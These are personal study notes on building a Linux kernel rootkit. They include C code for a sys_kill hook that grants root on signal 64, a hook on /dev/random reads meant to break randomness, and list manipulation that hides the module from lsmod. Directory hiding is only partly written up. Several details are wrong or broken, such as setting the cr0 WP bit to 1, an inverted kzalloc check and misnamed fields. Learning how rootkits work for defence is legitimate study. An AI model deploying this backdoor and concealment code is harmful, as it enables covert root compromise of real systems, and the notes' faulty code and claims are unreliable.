# Syscall Table Hijacking

- will work in Linux kernel 4.4

- **syscall table**: maps syscall ID -> kernel address

Steps:

1. get write permissions on syscall table
   - modify WP bit of cr0 register to 1
2. get address of system call table
   - `/proc/kallsyms` has mapping of kenrel syscalls (including syscall table?) (run `sudo cat kallsyms | grep "sys_call_table"`)
   - can use the syscall `kallsyms_lookup_name()` (defined in `kallsyms.h`) to get the address of syscalls in code
     - exported in Linux kernel version 4.4

# TheXcallerator Linux Kernel Rootkits

### Part 3: A Backdoor to Root

- LKM can hook any exposed function in kernel memory (#TODO: what does "exposed function in kernel memory" mean?)
- `kill` userspace tool calls `sys_kill`
  - can send signals to processes
  - signals ex. `SIGTERM`, `SIGKILL`
    - `SIGUSR1`: customizable signal
    - `SIGINT`: interrupt signal
  - signals found in `signal(7)` + `signal.h`
  - names of signals are numbers
    - ex. `SIGKILL` is `9` (so we type `kill -9 $PID`)
    - numbers only go up to 32 (on x86)
- to hook `sys_kill`:
  - will have two copies of hook: 1 for newer `pt_regs` convention, one for pre-4.17.0 version
  - check `sig` argument - is it `64`?
    - if so, call `set_root()`

```C
asmlinkage int hook_kill(const struct pt_regs *regs) {
    void set_root(void);
    int sig = regs->sig;

    if (sig == 64) {
        printk(KERN_INFO "rootkit: giving root ...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);
}


```

- changing credentials:
  - from kernel documentation: "a task can alter its own credentials, and may not alter those of another task" -> ie. we cannot give another process root but we can give ourselves root from within a running process (by running `kill -64 1`)
    - we can use any PID as the target PID bc we aren't actually using the PID within our hooking functionality - it is just to trigger `sys_kill`
  - steps:
    - initialize a `cred` struct
    - `prepare_creds()` will fill this struct with the process's current credentials
    - because we want root privleges, and `uid` 0 and `gid` 0 mean root privleges, can just modify the values in the `cred` struct to 0
    - can make any changes as we want to this struct
    - we then commit the struct back to the process with `commit_creds()`

```C
void set_root(void) {

    /*
        // in `include/linux/cred.h`:

        struct cred {
            // redacted
            kuid_t uid; // real UID of task
            kgid_t gid; // real GID of task
            ...
        }

        // kuid_t -> struct with single field `val` of type `uid_t` -> u16
    */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL) {
    return;
    }

    // set credentials to root
    root->uid.val = root->gid.val = 0;
    // ...
    commit_creds(root);
}
```

### Part 4: Backdooring PRNGs by Interfering with Char Devices

- can hook other exposed (#TODO: must be exposed?) kernel functions (not just syscalls) that cannot be called directly

- goal: to mess up functionality of `random` and `urandom`
- char (character) devices: some kernel functionality that can be exposed to the user as a file
  - not real files, do not live on your hard drive; however, will behave like real files
    - when you run file, you will see `character special`
  - live under `/dev/`
  - source code found in `drivers/char`
  - common examples: `random` and `urandom` (kernel gives random bytes to user space, can be read with `dd` (`dd` converts and copies a file), ex. `dd if=/dev/random bs=1 count=32 | xxd`)
  - the kernel decides what to do when we read/write to a char device via the `file_operations` struct
    - each char device has a `file_operations` struct (with `.read` and `.write` fields that point to funcitons, which execute when reading from/writing to a char device respectively) assigned to it
  - `sys_read`:
    - 3 args:
      - 1. file descriptor
        - to the file descriptor in user space, would have to use `sys_open` syscall with filename provided
      - 2. pointer to buffer: user should allocate an empty buffer somewhere in memory, and the `sys_read` should write the output to the buffer
      - 3. number of bytes to read
        - note that when a read is performed, we will seek forwards automatically by the number of bytes read
    - returns number of bytes successfully read into `eax`
  - to meet our goal of manipulating reads to `random` and `urandom` via syscalls, we need to hook `sys_open` (used to get the file descriptors of `random` and `urandom`), `sys_read` (read those respectively), `sys_close` (to know when to stop watching for a file descriptor)
    - to prevent this additional complexity, we can hook functions other than syscalls

- looking at char device's read routines:

```C
const struct file_operations random_fops = {
    .read = random_read, // called when `random` is read from
    .write = random_write, // called when `random` is written to
    // ...
}

const struct file_operations urandom_fops = {
    .read = urandom_read, // called when `urandom` is read from
    .write = urandom_write, // called when `urandom` is written from
    // ...
}

static ssize_t random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppops) {
    int ret;
    ret = wait_for_random_bytes();
    if (ret != 0) {
        return ret;
    }

    return urandom_read_nowarn(file, buf, nbytes, ppos);
}
```

- we can hook both `random_read` and `urandom_read` to change contents of buffer with the read data before returning to userspace
- must check that a symbol name is exported by the kernel before hooking with ftrace
  - all syscalls automatically exported
  - `/proc/kallsyms`: lists all currently loaded kernel symbols with their memory addresses (so a symbol table for the running kernel)
    - has:
      - symbol addresses: virtual memory addresses where kernel functions, variables, data structures are (ex. `fffff...`)
      - only readable by root

  ```C
    static asmlinkage ssize_t (*orig_random_read) (struct file *file, char __user *buf, size_t nbytes, loff_t *pops);

    static asmlinkage ssize_t (*orig_urandom_read) (struct file *file, char __user *buf, size_t nbytes, loff_t *pops);
  ```

- a very simple hook (that when hooked up with `ftrace`) will print to `dmesg` every time we try to read from `/dev/random`

```C

static asmlinkage ssize_t hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos) {
    int bytes_read;
    bytes_read = orig_random_read(file, buf, nytes, ppos);
    printk(KERN_DEBUG "rookit: intercepted read to /dev/random: %d bytes\n", bytes_read);

    return bytes_read;
}
```

- goal: we want to modify the hook to fill the buffer in user space with `0x00`.
  - remember buffer is an address in user space (`__user`) virtual memory, and we don't know where this virtual address maps to physically, so we cannot perform a read/write operation without segfaulting
  - therefore we have to use `copy_from_user()` and `copy_to_user()` functions, which let us copy data between arrays in user space and kernel space
    - to use these, need an array in kernel space (can use `kzalloc()`)
      - `kzalloc()`
        - args: size and some flags
        - returns: a region of memory of the size we wanted with the address
      - `kfree()`
        - use when we are done with this buffer, no longer need this patch of memory

      ```C
      char *kbuf = NULL;
      int buf_size = 32;

      kbuf = kzalloc(buf_size, GFP_KERNEL); // `GFP_KERNEL` flag indicates that this buffer is allocated in kernel memory
      if (kbuf)
          printk(KERN_ERRO "could not allocate buffer\n");

      // do something with the buffer
      kfree(kbuf);
      ```

- #TODO: would modify the `hook_random_read` to use `copy_to_user` to copy a buffer with null bytes to the user space buffer

- remember, you only have to the do `pt_regs` structs for function hooks for syscalls in kernel space rootkits ()

### Part 5: Hiding Kernel Modules from Userspace

- `lsmod` reveals the presense of any rootkits
- however, `lsmod` is a userspace tool that gets information from the kernel, so `lsmod` can be tricked by the kernel

- linked lists:

  ```C
      struct my_obj {
          int value;
          struct my_object *next, *prev;
      }
  ```

  - each linked list entry does not know it's index, only what is in front and behind it
    - therefore adding/removing/inserting an item in a linked list is easy because we can just update pointers, do not have to resize arrays, etc.
  - kernel uses lots of linked lists:

    ```C
         // include/linux/types.h:

         struct list_head {
             // no `val` entry, instead the `list_head` struct is included as a field within another struct that holds the objects linked tg in the kernel
             struct list_head *next, *prev;
         }
    ```

- every loaded kernel module has a `THIS_MODULE` object set up for it and available as a macro:

```C
    #ifdef MODULE
    extern struct module __this_module;
    #define THIS_MODULE (&__this_module)
    #else
    #define THIS_MODULE ((struct module *)0)
    #endif
```

- `THIS_MODULE` is a pointer to a `module` struct (defined in `include/linux/module.h`)

  ```C
      struct module {
          enum module_state state;

          struct list_head list; // member of list of modules, meaning we have a linked list

          char name[MODULE_NAME_LEN]; // unique handle for this module

          // ...
      }
  ```

- can use `list_entry()` function to look at the prev and next loaded kernel modules from our rootkit LKM

- can use signals to communicate with rootkit - send `64` signal to toggle the module as hidden or revealed:

```C
static short hidden = 0;
asmlinkage int hook_kill(const struct pt_regs *regs) {
    void showme(void);
    void hideme(void);

    int sig = regs->si;

    if ((si == 64) && (hidden ==0)) {
        printk(KERN_INFO "rootkit: hiding rootkit!\n");
        // before calling `hideme()` (which deletes our kernel module from the list) we must save our current position so that `showme()` can put us back in the right place later (can save this in a pointer to a `list_head` struct)
        hideme();
        hidden = 1;
    } else if ((sig == 64) && (hidden == 1)) {
        printk(KERN_INFO "rootkit: revealing rootkit!");
        showme();
        hidden = 0;
    }
    else
        return orig_kill(regs);
}

static struct list_head *prev_module;
void hideme(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}


void showme(void) {
    list_add(&THIS_MODULE->list, prev_module);
}

```

- `THIS_MODULE` is still in memory, we have simply rigged the pointers in the linked list to skip over it (#TODO: figure out how it will still run in memory, while getting the "pointers" (which userspace tools use to find currently loaded modules to skip over it)

```
$ lsmod | grep rootkit # still there
$ kill -64 1
$ lsmod | grep rootkit # nothing there !
$ dmesg # should see logs related to our rootkit
$ sudo rmmod rootkit # would error!!
```

- `rmmod rootkit` would error because `rmmod` loops through every item in the linked list of modules and looks for a name that matches with the one we specified, so we must send `kill -64 1` again before unloading the module

- although this technique hides it from `lsmod`, etc. the rootkit is still running in memory, and therefore detectable to any memory analysis tools

### Part 6: Hiding Directories

- have to manipulate structure returned by the kernel to userspace
- directory listing is handled by syscall `sys_getdents64` (+ 32-bit version `sys_getdents`) -> we will hook both, but the 32-bit verison has a small addition
  - techniques:
    - call the og function to have original functionality
    - use `copy_from_user()`, `copy_to_user()`, have to look at struct structure + it's members

- `sys_getdents`:
  - gives two results (`sys_getdents64` + 32-bit version)
  - `sys_getdents64`: `SYSCALL_DEFINE3(getdents64, unsigned int, fd, struct_linux_...)` macro -> `int sys_getdents64(unsigned int fd, struct linux_dirent 64 __user *dirent, unsigned int count); `
    - `linux_dirent64` gives information about directory listing
      - fields:
        - `d_reclen`: record length - total size of struct in bytes, lets you jump through structs in memory looking for what we want
        - `d_name`: string with directory name

- syscalls on `ls` (`strace ls`):

```bash
execve(...) # call execve to execute "ls" and 72 env vars

# ...

openat (...) # call openat syscall with "." directory to get a file descriptor (3)

fstat(...) # check the directory pointed to by fd 3 exists

getdents64(...) # call getdents64 syscall with file descriptor and a pointer to user space

close(3) = 0 # close file descriptor

```

- `sys_getdents64`: called with all it's arguments, it has written 600 bytes into buffer we provided, we have to allocate buffer into kernel space, modify it there, then copy it back

- `getdents64` fills the buffer with a sequence of variable-length `struct linux_dirent64` records and `strace` parses that buffer and reports how many recordsi tfound

### Part 7: Hiding Processes

### Part 8: Hiding Open Ports
